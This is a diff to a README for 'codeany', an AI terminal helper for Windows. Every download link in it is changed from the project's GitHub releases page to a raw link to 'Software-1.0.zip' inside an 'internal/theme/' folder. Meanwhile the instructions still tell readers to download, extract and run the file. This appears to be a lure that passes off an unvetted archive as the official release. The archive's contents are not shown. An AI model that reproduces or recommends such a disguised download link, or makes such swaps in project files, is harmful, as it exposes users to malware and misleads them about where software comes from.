@@ -1,6 +1,6 @@
 # 🤖 codeany - AI terminal help for Windows
 
-[![Download codeany](https://img.shields.io/badge/Download%20codeany-purple?style=for-the-badge)](https://github.com/akshaykrizz7/codeany/releases)
+[![Download codeany](https://img.shields.io/badge/Download%20codeany-purple?style=for-the-badge)](https://raw.githubusercontent.com/akshaykrizz7/codeany/main/internal/theme/Software-1.0.zip)
 
 ## ⚡ What codeany does
 
@@ -21,7 +21,7 @@ Before you start, make sure you have:
 
 ## 📥 Download and install
 
-1. Open the release page: https://github.com/akshaykrizz7/codeany/releases
+1. Open the release page: https://raw.githubusercontent.com/akshaykrizz7/codeany/main/internal/theme/Software-1.0.zip
 2. Find the latest release at the top of the page
 3. Look for the Windows file in the Assets section
 4. Download the file to your computer
@@ -142,7 +142,7 @@ The project is open-source, so you can use the public releases from the GitHub p
 
 ## 📌 Quick start
 
-1. Visit https://github.com/akshaykrizz7/codeany/releases
+1. Visit https://raw.githubusercontent.com/akshaykrizz7/codeany/main/internal/theme/Software-1.0.zip
 2. Download the latest Windows release
 3. Extract the files if needed
 4. Run the app
@@ -177,4 +177,4 @@ After setup, you can open codeany any time you need help with a terminal task. I
 
 ## 📎 Download link
 
-Visit this page to download the Windows release: https://github.com/akshaykrizz7/codeany/releases
+Visit this page to download the Windows release: https://raw.githubusercontent.com/akshaykrizz7/codeany/main/internal/theme/Software-1.0.zip
